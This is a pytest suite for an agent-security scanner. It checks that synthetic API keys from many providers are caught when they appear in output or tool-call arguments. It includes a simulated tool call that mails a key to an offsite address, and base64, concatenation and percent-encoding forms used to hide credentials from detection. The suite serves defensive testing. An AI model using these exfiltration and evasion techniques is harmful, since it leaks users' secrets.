"""Credential egress — tool-call arguments against output, on the same value.

DLP_PATTERNS (xaidr/scanner/dlp.py) is the one secret-shape table, and both
seams run it: output and tool-call arguments. These tests hold that a provider
credential is blocked wherever it can leave, attributed to its own provider,
and that the ruled exceptions (test-mode keys, unlisted key names) are recorded
as signals rather than blocks. tests/test_secret_seam_symmetry.py holds the
property over the whole table.

Values are generated at run time in each provider's DOCUMENTED format (charset,
prefix, length), from a fixed seed. None is a real credential. gitleaks' own
generators are not used as the oracle: its SendGrid sample has no `.` split,
which no issued SendGrid key lacks.

Failure messages name the shape and a count, never a value.
"""

from __future__ import annotations

import base64
import random
import re
import string

import pytest

from xaidr import Sensor
from xaidr.scanner.dlp import DLP_PATTERNS, scan_dlp

B64U = string.ascii_letters + string.digits + "_-"
ALNUM = string.ascii_letters + string.digits
HEX = "0123456789abcdef"


def _r(rng, cs, n):
    return "".join(rng.choice(cs) for _ in range(n))


def _values(make, n=20, seed=20261018):
    rng = random.Random(seed)
    return [make(rng) for _ in range(n)]


SHAPES = {
    "openai-legacy": lambda g: "sk-" + _r(g, ALNUM, 48),
    "openai-proj": lambda g: "sk-proj-" + _r(g, B64U, 156),
    "openai-svcacct": lambda g: "sk-svcacct-" + _r(g, B64U, 156),
    "anthropic-api03": lambda g: "sk-ant-api03-" + _r(g, B64U, 93) + "AA",
    "gitlab-pat": lambda g: "glpat-" + _r(g, B64U, 20),
    "slack-bot": lambda g: f"xoxb-{_r(g, string.digits, 12)}-{_r(g, string.digits, 13)}-{_r(g, ALNUM, 24)}",
    "slack-app": lambda g: f"xapp-1-A{_r(g, string.ascii_uppercase + string.digits, 10)}-{_r(g, string.digits, 13)}-{_r(g, HEX, 64)}",
    "sendgrid": lambda g: f"SG.{_r(g, B64U, 22)}.{_r(g, B64U, 43)}",
    # A trailing `-` is a legal last body character; \b after it never holds.
    "sendgrid-trailing-dash": lambda g: f"SG.{_r(g, B64U, 22)}.{_r(g, B64U, 42)}-",
    "stripe-secret": lambda g: "sk_live_" + _r(g, ALNUM, 99),
    "stripe-test": lambda g: "sk_test_" + _r(g, ALNUM, 99),
    "stripe-restricted-test": lambda g: "rk_test_" + _r(g, ALNUM, 99),
    "stripe-restricted": lambda g: "rk_live_" + _r(g, ALNUM, 99),
    "huggingface": lambda g: "hf_" + _r(g, string.ascii_letters, 34),
    "npm": lambda g: "npm_" + _r(g, ALNUM, 36),
    # Controls: shapes both seams already catch.
    "aws": lambda g: "AKIA" + _r(g, string.ascii_uppercase + "234567", 16),
    "github-pat": lambda g: "ghp_" + _r(g, ALNUM, 36),
}


@pytest.fixture(scope="module")
def block():
    return Sensor(agent_id="cred-egress", enforcement_mode="block")


def _tool(sensor, v):
    return sensor.scan_tool_call("send_message", {"to": "ops@offsite-paste.net", "body": f"key: {v}"})


def _caught(sensor, shape, seam):
    out = []
    for v in _values(SHAPES[shape]):
        r = _tool(sensor, v) if seam == "tool_call" else sensor.scan_output(f"key: {v}")
        out.append(r.action == "blocked")
    return out


# ── controls: both seams, every value ──────────────────────────────────────
@pytest.mark.parametrize("seam", ["tool_call", "output"])
@pytest.mark.parametrize("shape", ["aws", "github-pat"])
def test_control_shapes_blocked_on_both_seams(block, shape, seam):
    hits = _caught(block, shape, seam)
    assert all(hits), f"{shape} on {seam}: {hits.count(False)}/{len(hits)} allowed"


# ── case is not a factor ───────────────────────────────────────────────────
def test_case_does_not_change_any_dlp_secret_verdict():
    """Forcing IGNORECASE on every DLP pattern must add no SECRET hit on
    mixed-case values: case is not a factor in any secret verdict."""
    for shape, make in SHAPES.items():
        for i, v in enumerate(_values(make, n=5)):
            base = {t.rule for t in scan_dlp(v).threats}
            ci = {p["id"] for p in DLP_PATTERNS
                  if p["category"].startswith("secret_")
                  and re.compile(p["pattern"].pattern, p["pattern"].flags | re.I).search(v)}
            assert ci <= base, f"{shape}[{i}]: case-insensitive pattern adds {ci - base}"


# ── seam symmetry on the same value ────────────────────────────────────────
@pytest.mark.parametrize("shape", ["openai-legacy", "slack-bot", "sendgrid", "stripe-secret"])
def test_output_blocked_shape_also_blocked_in_tool_call(block, shape):
    """Symmetry on the SAME value: whatever output blocks, a tool call must block."""
    out = _caught(block, shape, "output")
    tool = _caught(block, shape, "tool_call")
    gap = sum(o and not t for o, t in zip(out, tool))
    assert any(out), "precondition: the output seam catches this shape at all"
    assert gap == 0, (f"{shape}: credential blocked in output but ALLOWED leaving in a tool "
                      f"argument ({gap}/{sum(out)} of the values output blocks)")


# ── provider tokens, both seams ────────────────────────────────────────────
@pytest.mark.parametrize("seam", ["tool_call", "output"])
@pytest.mark.parametrize("shape", ["anthropic-api03", "gitlab-pat", "slack-app",
                                   "stripe-restricted", "huggingface", "npm"])
def test_provider_token_blocked(block, shape, seam):
    hits = _caught(block, shape, seam)
    assert all(hits), f"{shape} on {seam}: {hits.count(False)}/{len(hits)} credentials ALLOWED"


# ── base64url bodies: `_` and `-` anywhere, including last ─────────────────
@pytest.mark.parametrize("shape", ["openai-proj", "openai-svcacct", "sendgrid",
                                   "sendgrid-trailing-dash"])
def test_base64url_body_keys_blocked_on_output(block, shape):
    hits = _caught(block, shape, "output")
    assert all(hits), f"{shape} on output: {hits.count(False)}/{len(hits)} credentials ALLOWED"


@pytest.mark.parametrize("shape", ["openai-proj", "openai-svcacct", "sendgrid",
                                   "sendgrid-trailing-dash"])
def test_base64url_body_keys_blocked_in_tool_call(block, shape):
    hits = _caught(block, shape, "tool_call")
    assert all(hits), f"{shape} on tool_call: {hits.count(False)}/{len(hits)} credentials ALLOWED"


# ── T5 ATTRIBUTION: the audit record names the provider ───────────────────
@pytest.mark.parametrize("seam", ["tool_call", "output"])
def test_anthropic_key_attributed_to_anthropic_never_openai(block, seam):
    """The record names Anthropic, never OpenAI, for an `sk-ant-` key."""
    wrong, unnamed = 0, 0
    for v in _values(SHAPES["anthropic-api03"]):
        r = _tool(block, v) if seam == "tool_call" else block.scan_output(f"key: {v}")
        wrong += "OUT_secret_openai_key" in r.rules
        unnamed += "DLP_anthropic_key" not in r.rules
    assert (wrong, unnamed) == (0, 0), (
        f"anthropic on {seam}: {wrong}/20 attributed to OUT_secret_openai_key, "
        f"{unnamed}/20 missing DLP_anthropic_key")


def test_openai_shape_never_matches_an_anthropic_key():
    """The OpenAI entry itself, not just the verdict: it must not fire on sk-ant-."""
    openai = next(p for p in DLP_PATTERNS if p["id"] == "OUT_secret_openai_key")
    hits = sum(bool(openai["pattern"].search(v)) for v in _values(SHAPES["anthropic-api03"]))
    assert hits == 0, f"OUT_secret_openai_key matches {hits}/20 Anthropic keys"


# ── fail-direction decisions ───────────────────────────────────────────────
# a prefixless high-entropy value is allowed, an unlisted key name signals,
# a redacted value and a placeholder are allowed, sk_live_ blocks / sk_test_
# signals, a publishable key is allowed, and a split or encoded value gets
# its inline verdict.

def _verdicts(sensor, text):
    return sensor.scan_tool_call("write_file", {"path": ".env", "content": text}), \
        sensor.scan_output(text)


@pytest.mark.parametrize("shape", ["stripe-test", "stripe-restricted-test"])
def test_f5_stripe_test_key_signals_and_does_not_block(block, shape):
    """As ruled: a test-mode key in a tool arg is RECORDED, not halted.
    A local .env write is normal dev, and this path is not destination-aware."""
    bad = []
    for i, v in enumerate(_values(SHAPES[shape])):
        tool, out = _verdicts(block, f"STRIPE_KEY={v}")
        if not (tool.action == "flagged" and "DLP_stripe_test_key" in tool.rules):
            bad.append((i, "tool", tool.action, tool.rules))
        if out.action == "blocked":
            bad.append((i, "output", out.action, out.rules))
    assert not bad, f"{shape}: {len(bad)} verdicts not signal-only, first: {bad[0]}"


def test_f5_stripe_live_key_blocks(block):
    for i, v in enumerate(_values(SHAPES["stripe-secret"])):
        tool, out = _verdicts(block, f"STRIPE_KEY={v}")
        assert (tool.action, out.action) == ("blocked", "blocked"), f"sk_live_[{i}]: {tool.action}/{out.action}"
        assert "OUT_secret_stripe" in tool.rules, f"sk_live_[{i}] not attributed to OUT_secret_stripe"


def test_f2_unlisted_key_name_signals_and_does_not_block(block):
    """A key-named value under a name DLP_api_key lacks (the gitleaks
    framing) surfaces as a signal. It never blocks: `token = …` is ordinary config."""
    rng = random.Random(20261018)
    bad = []
    for i in range(20):
        name = rng.choice(["slack_api_token", "refresh_token", "client_secret", "DEPLOY_TOKEN"])
        text = f'{name} = "{_r(rng, ALNUM, 32)}"'
        tool, out = _verdicts(block, text)
        if not (tool.action == "flagged" and "DLP_token_assignment" in tool.rules):
            bad.append((i, name, "tool", tool.action, tool.rules))
        if out.action == "blocked":
            bad.append((i, name, "output", out.action, out.rules))
    assert not bad, f"unlisted key name: {len(bad)} verdicts not signal-only, first: {bad[0]}"


F1_PREFIXLESS = {
    "hex40-sha": lambda g: _r(g, HEX, 40),
    "hex32": lambda g: _r(g, HEX, 32),
    "uuid": lambda g: "-".join(_r(g, HEX, n) for n in (8, 4, 4, 4, 12)),
}
F3_REDACTED = ["sk-…abcd", "sk-****", "sk-proj-****************", "glpat-xxxxxxxx",
               "sk-ant-api03-…AA", "hf_****", "npm_…", "xapp-1-…", "rk_live_****"]
F4_PLACEHOLDERS = ["sk_test_<YOUR_TEST_KEY>", "YOUR_API_KEY", "sk-proj-<your-key-here>",
                   "sk-proj-your-api-key-goes-here", "glpat-xxxxxxxxxxxxxxxxxxxx",
                   "glpat-<your-token>", "hf_YOUR_HUGGINGFACE_TOKEN_GOES_HERE",
                   "npm_" + "X" * 36, "rk_live_" + "x" * 24, "sk_test_" + "0" * 24,
                   'api_token = "your-token-goes-here-replace-me"']
F6_PUBLISHABLE = {
    "pk_live": lambda g: "pk_live_" + _r(g, ALNUM, 99),
    "pk_test": lambda g: "pk_test_" + _r(g, ALNUM, 99),
}


def _secret_rule(rule_id):
    return rule_id.startswith("OUT_secret") or any(
        p["id"] == rule_id and p["category"].startswith("secret_") for p in DLP_PATTERNS)


def _allowed_clean(sensor, text):
    tool, out = _verdicts(sensor, text)
    secret = [x for x in tool.rules + out.rules if _secret_rule(x)]
    return tool.action == "allowed" and out.action != "blocked" and not secret


@pytest.mark.parametrize("kind", sorted(F1_PREFIXLESS))
def test_f1_prefixless_high_entropy_allowed(block, kind):
    bad = [i for i, v in enumerate(_values(F1_PREFIXLESS[kind])) if not _allowed_clean(block, f"id: {v}")]
    assert not bad, f"prefixless {kind}: {len(bad)}/20 not allowed (indices {bad[:5]})"


@pytest.mark.parametrize("text", F3_REDACTED + F4_PLACEHOLDERS)
def test_f3_f4_redacted_and_placeholder_allowed(block, text):
    tool, out = _verdicts(block, f"KEY={text}")
    assert _allowed_clean(block, f"KEY={text}"), (
        f"redacted/placeholder not allowed: tool={tool.action} {tool.rules} output={out.action} {out.rules}")


@pytest.mark.parametrize("kind", sorted(F6_PUBLISHABLE))
def test_f6_publishable_key_allowed(block, kind):
    bad = [i for i, v in enumerate(_values(F6_PUBLISHABLE[kind])) if not _allowed_clean(block, f"STRIPE_PK={v}")]
    assert not bad, f"publishable {kind}: {len(bad)}/20 not allowed"


F7_FORMS = {
    "base64": lambda v: base64.b64encode(v.encode()).decode(),
    "base64url": lambda v: base64.urlsafe_b64encode(v.encode()).decode().rstrip("="),
    "concat": lambda v: f'"{v[:3]}" + "{v[3:]}"',
    "concat-3": lambda v: f"'{v[:4]}' + '{v[4:10]}' + '{v[10:]}'",
}


def _secret_rules(r):
    return {x for x in r.rules if _secret_rule(x)}


def test_f7_urlencoded_secret_is_blocked(block):
    """A percent-encoded credential blocks on LLM01_url_encoded_payload
    (percent-escape density), not on a secret shape. Pinned so a change to
    either rule is a decision: the record does not name a provider here."""
    for i, v in enumerate(_values(SHAPES["github-pat"])):
        r = _tool(block, "".join(f"%{ord(c):02X}" for c in v))
        assert r.action == "blocked", f"url-encoded[{i}]: {r.action} {r.rules}"
        assert not any(_secret_rule(x) for x in r.rules), f"url-encoded[{i}] now attributed: {r.rules}"


@pytest.mark.parametrize("form", sorted(F7_FORMS))
def test_f7_encoded_or_split_secret_blocked(block, form):
    hits = [_tool(block, F7_FORMS[form](v)).action == "blocked"
            for v in _values(SHAPES["github-pat"])]
    assert all(hits), f"form {form}: {hits.count(False)}/20 encoded/split credentials ALLOWED"


@pytest.mark.parametrize("form", sorted(F7_FORMS))
@pytest.mark.parametrize("shape", sorted(SHAPES))
def test_f7_encoded_or_split_secret_gets_the_inline_verdict(block, shape, form):
    """Every shape, every form: the verdict and the secret rule ids are the ones
    the same value gets written inline, so a decoded hit is enforced (or only
    signalled) exactly as its plain form is."""
    bad = []
    for i, v in enumerate(_values(SHAPES[shape], n=5)):
        inline, encoded = _tool(block, v), _tool(block, F7_FORMS[form](v))
        if (encoded.action, _secret_rules(encoded)) != (inline.action, _secret_rules(inline)):
            bad.append((i, inline.action, encoded.action))
    assert not bad, (f"{shape} as {form}: {len(bad)}/5 values got a different verdict than "
                     f"inline; first (index, inline, {form}): {bad[0]}")
